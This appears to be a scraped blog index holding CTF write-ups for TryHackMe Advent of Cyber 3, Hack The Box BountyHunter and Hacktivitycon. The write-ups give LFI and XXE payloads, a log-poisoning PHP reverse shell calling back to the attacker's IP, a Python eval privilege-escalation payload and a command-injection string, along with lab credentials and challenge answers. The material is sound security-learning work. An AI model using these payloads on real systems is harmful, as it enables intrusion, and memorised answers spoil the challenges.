out.\nSo, in short, XSS is injecting Javascript code to do things attackers want. With that being said, let\u0026rsquo;s jump in.\n\u0026hellip;\nActually, hasn\u0026rsquo;t the challenge description itself done all the hassle for us? Isn\u0026rsquo;t it revealing too much? \u0026lt;(￣﹌￣)\u0026gt;\nBasically this\u0026rsquo;s what\u0026rsquo;s going to happen if you change your password. In real life, whoever implemented this password changing function must be reprimanded ASAP. But as it\u0026rsquo;s a ctf challenge, let\u0026rsquo;s now gratefully exploit it. (￣▽￣)\nStrictly follow the challenge\u0026rsquo;s instruction, let\u0026rsquo;s comment this on all pages. Shortly after, we got in Grinch user\u0026rsquo;s account. Here\u0026rsquo;s the answer for today\u0026rsquo;s challenge. [Day 6] Web Exploitation: Patch Management Is Hard Today\u0026rsquo;s learning objective is LFI - local file inclusion.\nNormally if you keep default Apache/Nginx configuration, LFI shouldn\u0026rsquo;t happen, but as an attacker it\u0026rsquo;s certainly worth a try.\nTo keep it short, local file inclusion is - as you may guess - a vulnerability that let attackers access local files on the machine.\nSometimes, LFI leads to RCE, mostly via log files (log poinsoning) or PHP session - whatever means that you can store your arbitrary code, in order to execute it from PHP filter later on.\nOkay, enough theory, let\u0026rsquo;s dive in. :D\nUpon visiting the page, we see this:\n And as you can see, the entry point is literally in the request URL:\n Before we get started, let\u0026rsquo;s test if this server is vulnerable to LFI. :D\nhttp://10.10.132.156/index.php?err=/etc/passwd  It\u0026rsquo;s. So it\u0026rsquo;s not hard to read the first flag:\nhttp://10.10.16.195/index.php?err=/etc/flag  But if we try to use the very same method to access index.php file, we\u0026rsquo;ll get an error.\nhttp://10.10.16.195/index.php?err=index.php  Since the index.php file also include header.php, and they both declare getuseragent() function, we cannot access it directly. Therefore, let\u0026rsquo;s access it through PHP filter:\nhttp://10.10.16.195/index.php?err=php://filter/resource=index.php  Seems no better. Why? Because the functions are still there. So let\u0026rsquo;s try to encode it in base64.\nhttp://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=index.php The server returned a very long base64 string - much longer than a simple error should be, which meant a different result.\nHere\u0026rsquo;s that string, base64 decoded:\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ echo \u0026#34;PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+\u0026#34; | base64 -d \u0026lt;?php session_start(); $flag = \u0026#34;THM{791d43d46018a0d89361dbf60d5d9eb8}\u0026#34;; include(\u0026#34;./includes/creds.php\u0026#34;); if($_SESSION[\u0026#39;username\u0026#39;] === $USER){  header( \u0026#39;Location: manage.php\u0026#39; );  die(); } else {  $labNum = \u0026#34;\u0026#34;;  require \u0026#34;./includes/header.php\u0026#34;; ?\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;  \u0026lt;div class=\u0026#34;col-lg-12\u0026#34;\u0026gt;  \u0026lt;/div\u0026gt;  \u0026lt;div class=\u0026#34;col-lg-8 col-offset-1\u0026#34;\u0026gt;  \u0026lt;?php if (isset($error)) { ?\u0026gt;  \u0026lt;span class=\u0026#34;text text-danger\u0026#34;\u0026gt;\u0026lt;b\u0026gt;\u0026lt;?php echo $error; ?\u0026gt;\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt;  \u0026lt;?php }  ?\u0026gt;  \u0026lt;p\u0026gt;Welcome \u0026lt;?php echo getUserName(); ?\u0026gt;\u0026lt;/p\u0026gt;  \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;This server has sensitive information. Note All actions to this server are logged in!\u0026lt;/div\u0026gt;  \u0026lt;/div\u0026gt; \u0026lt;?php if($errInclude){ include($_GET[\u0026#39;err\u0026#39;]);} ?\u0026gt; \u0026lt;/div\u0026gt;  \u0026lt;?php } ?\u0026gt; And here comes our second flag. :D\nLooking at the source code, we can find another file seems potentially useful.\ninclude(\u0026#34;./includes/creds.php\u0026#34;); So let\u0026rsquo;s go for it!\nhttp://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php And quite easily, we\u0026rsquo;d got the credentials.\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ echo \u0026#34;PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/\u0026#34; | base64 -d \u0026lt;?php $USER = \u0026#34;McSkidy\u0026#34;; $PASS = \u0026#34;A0C315Aw3s0m\u0026#34;; ? What\u0026rsquo;s left - logging in using that account. Here\u0026rsquo;s the password recovery page: For the next question, the task ask for the hostname of the webserver. Let me show you the easy way.\nhttp://10.10.16.195/index.php?err=/etc/hosts  Simple as that, and the THM challenge actually ended here. From this point onward is just bonus steps for learning purposes. :D\nSo, there\u0026rsquo;s a log.php site that let you access request logs. Following the challenge\u0026rsquo;s tutorial, I sent a request like this:\n$ curl -A \u0026#34;lmao I\u0026#39;m here\u0026#34; http://10.10.16.195 Checking the logs, we can clearly see where our payload went.\n Using the exact method, this time I sent a real PHP payload.\ncurl -A \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34; http://10.10.16.195  However, as you may expected, the payload\u0026rsquo;s not executed just by visiting the page. So I visit it again, this time via LFI.\nhttp://10.10.16.195/index.php?err=php://filter/resource=./includes/logs/app_access.log  As you may see, the server gracefully executed our payload. Without a second thought, I went straight to reverse shell cheat sheet, grab a PHP payload and sent it. Basically it looked like this.\n\u0026lt;?php $sock=fsockopen($MY-IP,$PORT);$proc=proc_open(/bin/sh -i, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes); ?\u0026gt;Send it.\ncurl --user-agent \u0026#39;\u0026lt;?php $sock=fsockopen(\u0026#34;$MY-IP\u0026#34;,9999);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes); ?\u0026gt;\u0026#39; http://$SERVER-IP Open a port to receive it.\nnc -lvnp 9999 Access the log via LFI again to execute the payload.\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ nc -lvnp 9999 1 ⨯ listening on [any] 9999 ... connect to [10.4.35.200] from (UNKNOWN) [10.10.161.15] 34994 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) That\u0026rsquo;s it. We\u0026rsquo;re in.\n$ cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=12.04 DISTRIB_CODENAME=precise DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 12.04.5 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;12.04.5 LTS, Precise Pangolin\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu precise (12.04.5 LTS)\u0026#34; VERSION_ID=\u0026#34;12.04\u0026#34; We can see this box\u0026rsquo;s using a quite outdated version of Ubuntu. A quick searchsploit return a lot of useful resources:\n$ searchsploit ubuntu 12.04 130 ⨯ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Linux Kernel (Ubuntu 11.10/12.04) - binfmt_script Stack Data Disclosure | linux/dos/41767.txt Linux Kernel 3.13.0 \u0026lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - \u0026#39;overlayfs\u0026#39; Local Privilege Escalation | linux/local/37292.c Linux Kernel 3.13.0 \u0026lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - \u0026#39;overlayfs\u0026#39; Local Privilege Escalation (Access /etc/shadow) | linux/local/37293.txt Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - \u0026#39;perf_swevent_init\u0026#39; Local Privilege Escalation (3) | linux_x86-64/local/33589.c Linux Kernel \u0026lt; 3.2.0-23 (Ubuntu 12.04 x64) - \u0026#39;ptrace/sysret\u0026#39; Local Privilege Escalation | linux_x86-64/local/34134.c Linux Kernel \u0026lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - \u0026#39;SOCK_DIAG\u0026#39; SMEP Bypass Local Privilege Escalation | linux_x86-64/local/44299.c Ubuntu \u0026lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation | linux/local/41760.txt usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation | linux/local/36820.txt ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results However, since the box lacked basic utilities:\n$ gcc /bin/sh: 19: gcc: not found $ curl /bin/sh: 20: curl: not found $ wget /bin/sh: 21: wget: not found I attempted no further. But you can try to privilege escalate on this box by yourself, for the sake of learning. :D\nYou can also get RCE with PHP session. Here\u0026rsquo;s the end result: But as this task\u0026rsquo;s got quite lengthy, I\u0026rsquo;ll leave that part for you, then. :D\nHere\u0026rsquo;s the answers for today!\nDeploy the attached VM and look around. What is the entry point for our web application? err\nUse the entry point to perform LFI to read the /etc/flag file. What is the flag? THM{d29e08941cf7fe41df55f1a7da6c4c06}\nUse the PHP filter technique to read the source code of the index.php. What is the $flag variable's value? THM{791d43d46018a0d89361dbf60d5d9eb8}\nNow that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password? McSkidy:A0C315Aw3s0m\nUse the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server? THM{552f313b52e3c3dbf5257d8c6db7f6f1}\nThe web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log lfi-aoc-awesome-59aedca683fff9261263bb084880c965\n ","permalink":"https://git-akihakune.github.io/blog/adventofcyber3/","summary":"Writeup for 2021 Try Hack Me\u0026rsquo;s Advent of Cyber 3 (part 1)","title":"Try Hack Me - Advent Of Cyber 3 writeup (Part 1)"},{"content":"I. Enumeration  First things first, let\u0026rsquo;s start with a port scan!  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ nmap -sC -sV -oN nmap.txt 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 23:35 EDT Nmap scan report for 10.10.11.100 Host is up (0.68s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.32 seconds nothing particularly useful. We got 2 basic ports opening and their versions.\n Checking the service versions, seems like they\u0026rsquo;re relatively new (at the time of writing) and there\u0026rsquo;s no publicly available vulnerability or exploit for them. Manually open it in a web browser, there\u0026rsquo;s also nothing much there, except this \u0026ldquo;portal\u0026rdquo; page    Follow the link, we get to a simple page for submitting exploits:    Checking the source code a bit, we find out that this form create a POST request to \u0026ldquo;tracker_diRbPr00f314.php\u0026rdquo;  function returnSecret(data) { \treturn Promise.resolve($.ajax({  type: \u0026#34;POST\u0026#34;,  data: {\u0026#34;data\u0026#34;:data},  url: \u0026#34;tracker_diRbPr00f314.php\u0026#34;  })); }  async function bountySubmit() { \ttry { \tvar xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$(\u0026#39;#exploitTitle\u0026#39;).val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$(\u0026#39;#cwe\u0026#39;).val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$(\u0026#39;#cvss\u0026#39;).val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$(\u0026#39;#reward\u0026#39;).val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` \tlet data = await returnSecret(btoa(xml));  $(\u0026#34;#return\u0026#34;).html(data) \t} \tcatch(error) { \tconsole.log(\u0026#39;Error:\u0026#39;, error); \t} }  Upon triggering bountySubmit function, it\u0026rsquo;ll create an xml form and submit it. Sounds like a great XXE to me. Fire up Burp Suite and looking at POST requests, as expected, I saw an encoded string in the data variable of every POST request \u0026ldquo;It must contain the XML\u0026rdquo;, I thought. So I tried to decode it    According to the JS code, the data should be encoded in plain, old Base64, but somehow certain parts of the data seems to be miserably screwed up I messed around in Cyberchef a bit, but that screwed part didn\u0026rsquo;t seems to be meaningful anyway, so I gave up this vector and look for the XXE The idea of decoding it, replace with my payload and send it programmatically flashed into my mind, but at the end I chose a lazy way instead - triggering that returnSecret() function manually in browser DevTool After a few time of trial and error, our target finally seems to be vulnerable to XXE    Next thing is just trial and error, and by that, I mean A LOT OF trials and errors. Come up with a payload, type it in Chrome\u0026rsquo;s dev tool, check for responses in Burp Suite history (the dev tool console looks quite small to get any serious task done), see if it worked (and 9 out of 10 times, if didn\u0026rsquo;t), and repeat I tried all the payloads on OWASP referencing page, and long story short, seems like it\u0026rsquo;s not easy to get a RCE from this XXE Noticing that this site\u0026rsquo;s using PHP, I changed my payload a bit, but still\u0026hellip; nothing appeared. Blind XXE, and blind inject anything in general, is a pain ;-; That\u0026rsquo;s when I thought of encode it in base64 (the same as the sending payload) rather than trying to get it by plaintext    And hey! Looks like I had got the content of that log_submit.php file Using that exact payload, I tried to get files from other directories but\u0026hellip; seems like it\u0026rsquo;s not that easy So I mindlessly browsing around in disorientation. The URI of JS files has the same format \u0026ldquo;resources/some_file.js\u0026rdquo;, so I decided to test it against directory listing It worked perfectly, and from that directory, I had got a precious README.txt file  Tasks:  [ ] Disable \u0026#39;test\u0026#39; account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions  Come to think of it, this website\u0026rsquo;s root directory (located at/var/www/html I guess? Since it\u0026rsquo;s an Apache sever after all) must have something that I\u0026rsquo;d missed So I ran Gobuster and patiently waited for a good hour  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ gobuster dir --follow-redirect -e -u http://10.10.11.100 -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Follow Redirect: true [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/09/28 21:51:31 Starting gobuster in directory enumeration mode =============================================================== http://10.10.11.100/resources (Status: 200) [Size: 2840] http://10.10.11.100/assets (Status: 403) [Size: 277] http://10.10.11.100/css (Status: 403) [Size: 277] http://10.10.11.100/js (Status: 403) [Size: 277] ...  It ran quite fast at the start, and quite a lot of errors at the end. But after all, it revealed a /db.php file, which sounds really exciting    And finally, it returned some very useful stuffs.  \u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; $testuser = \u0026#34;test\u0026#34;; ?\u0026gt; Getting a database\u0026rsquo;s credentials but cannot logging in is like having your room\u0026rsquo;s key but the house key is nowhere to be found - not that much of use I tried with some combinations from those credentials on SSH, but seems like none of that was correct A certain passwd user list that I got from XXE earlier flashed through my mind, so I tried my luck  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ grep home passwd.txt syslog:x:104:110::/home/syslog:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash  That development user looks interesting, so I tried it with the database credentials    And we got it! The user flag!   II. Privilege escalation  5 seconds in and I\u0026rsquo;d already known what I was going to do:  development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User development may run the following commands on bountyhunter:  (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  Okay so we could run that ticketValidator.py file as root, and\u0026hellip;  development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py -r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py  It didn\u0026rsquo;t looks like we can modify that file anyway. So let\u0026rsquo;s cat it out and see what\u0026rsquo;s what.  development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file.  def load_file(loc):  if loc.endswith(\u0026#34;.md\u0026#34;):  return open(loc, \u0026#39;r\u0026#39;)  else:  print(\u0026#34;Wrong file type.\u0026#34;)  exit()  def evaluate(ticketFile):  #Evaluates a ticket to check for ireggularities.  code_line = None  for i,x in enumerate(ticketFile.readlines()):  if i == 0:  if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;):  return False  continue  if i == 1:  if not x.startswith(\u0026#34;## Ticket to \u0026#34;):  return False  print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;)  continue   if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;):  code_line = i+1  continue   if code_line and i == code_line:  if not x.startswith(\u0026#34;**\u0026#34;):  return False  ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0]  if int(ticketCode) % 7 == 4:  validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;))  if validationNumber \u0026gt; 100:  return True  else:  return False  return False  def main():  fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;)  ticket = load_file(fileName)  #DEBUG print(ticket)  result = evaluate(ticket)  if (result):  print(\u0026#34;Valid ticket.\u0026#34;)  else:  print(\u0026#34;Invalid ticket.\u0026#34;)  ticket.close  main()  Before breaking something, we\u0026rsquo;ve to understand how it works first. So I wrote a perfectly valid \u0026ldquo;ticket\u0026rdquo; for the script:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+90  And it worked as it should:  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends Valid ticket.  Now the real question is - how to exploit this \u0026ldquo;ticket\u0026rdquo; function The only line that caught my attention was this particular line:  validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) Yes, that eval.\n As far as I knew, eval can only be used with Python\u0026rsquo;s expressions, not statements. But a little bit of experience in Python can lead you to this:  \u0026gt;\u0026gt;\u0026gt; eval(exec(\u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;)) ┌──(aki㉿kali)-[~] └─$  The only obstacle in our way was this 2 lines:  ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4:  Basically, before we could get our sweet reverse shell, we need to bypass this check first Of those 2 lines, the first one defined a ticketCode variable which is equal to the first part of our payload, before the first \u0026ldquo;+\u0026rdquo; sign, excluding all \u0026ldquo;**\u0026rdquo;. If we just insert our payload there, it wouldn\u0026rsquo;t be able to be converted to int type and therefore, that eval statement would be ignored However, exec in Python3 actually does return something. So I tried this:  \u0026gt;\u0026gt;\u0026gt; eval(11+exec(\u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;)) ┌──(aki㉿kali)-[~] └─$ perfect. \u0026lsquo;^\u0026rsquo;\n So our full payload was:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+exec(\u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;)  Let\u0026rsquo;s try out if it worked  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends root@bountyhunter:/home/development# whoami root  And that\u0026rsquo;s it, a great challenge to learn about XXE.  ","permalink":"https://git-akihakune.github.io/blog/bountyhunter/","summary":"Writeup for Bounty Hunter box on Hack The Box","title":"Hack The Box - Bounty Hunter writeup"},{"content":"Warmups - Tsunami  Downloading the file and running file command, we get its file type - an audio file.\n Let\u0026rsquo;s think simple, and straight up open it in an audio editor - here I choose the open-source Audacity.\n And that\u0026rsquo;s it, we got the flag!\nWarmups - Pimple  Follow the exact same procedure as Tsunami, we have:\n Okay so what\u0026rsquo;s a GIMP XCF image? A quick Google search led me to some interesting information, including the official documentation. Following this great article, I tried to use an online converter but it did not seems to work\u0026hellip;\nSo let\u0026rsquo;s check GIMP package size, power off our attack machine, take a snapshot, then power it on again and sudo apt install gimp.\nRenaming the file to pimple.xcf and open it in GIMP, we got the flag.\n \u0026hellip; Those morose eyes were exactly like mine when I worked on some challenges.\nWarmups - Bass64  Oh, once again, hello John. This challenge here is pretty straight-forward. Download the file, open it, then resize our editor window to a suitable dimension, we have\n Directly base64 decoding it, we instantly got the flag.\nWarmups - Read The Rules  As they said, please be a civilized player and read the rules. The flag\u0026rsquo;s in the source code.\nWarmups - 2EZ  Another challenge from John. Let\u0026rsquo;s follow our procedure from previous challenges.\n Seems like our file command did not have much use here. Let\u0026rsquo;s try strings.\n JFIF\u0026hellip; so it should be an image file. Renaming its extension to jpg or gif didn\u0026rsquo;t solve anything, and file command\u0026rsquo;s magic also didn\u0026rsquo;t recognize the file\u0026rsquo;s type. So its file signature must be wrong.\nOpen it up in a hex editor, we can clearly see our guess was right.\n So we change the first 4 bytes accordingly to JFIF file signature and we got the flag!\nWeb - Swaggy  Following the url, we got to a pretty clean website.\n Messing around a bit, we knew that this site use the GUI to make curl GET request to an API endpoint. Execute sent a HTTP GET request to the endpoint, but it required basic authentication, encoded in base64. I tried with \u0026lsquo;user:password\u0026rsquo; but it returned 403: Invalid credentials. So, I tried another default creadential - \u0026lsquo;admin:admin\u0026rsquo;. And to my surprise - it returned the flag quite easily. Web - Titanic  Following the url, we got to a website with pretty decent UI. On a side note, you should really press that \u0026lsquo;Watch Video\u0026rsquo; button, quite informative.\nRight at the top of nav bar, we got the admin panel.\n I tried some common credentials, as well as checking the source code and requests, but nothing particularly interesting found, except that it used GET for authentication, which\u0026rsquo;s specially unrecommendable. So I returned to the home page and it led me to another engrossing service.\n I tried with https://google.com and it returned something like a screenshot image of Google. A flashback of HTB\u0026rsquo;s Love box, and I tried if it could also take a capture of local network sites. So it got me a glimpse on a loading page, which\u0026rsquo;s not much of use in this case. I checked Wappalyzer and found out that the server ran on Apache. A quick Google search revealed that Apache servers have a default server-status site which can be useful for log checking.\n And it actually did! Based on the requests\u0026rsquo; parameters, we got an user\u0026rsquo;s credential. Logging in that account, we got the flag.\nWeb - Confidentiality  Another John Hammond\u0026rsquo;s challenge it seems.\n So I just followed the placeholder and it gave me something that looks like a ls -l result.\n Looks like this site just run whatever command we want in a bash, provided that it starts with ls -l. So here comes the payload.\n And that\u0026rsquo;s it, we got the flag. You can also use .; cat flag.txt if you like.\n","permalink":"https://git-akihakune.github.io/blog/hacktivitycon/","summary":"Writeups for some easy challenges in hacktivitycon 2021","title":"Easy Hacktivitycon Challenges writeup"}]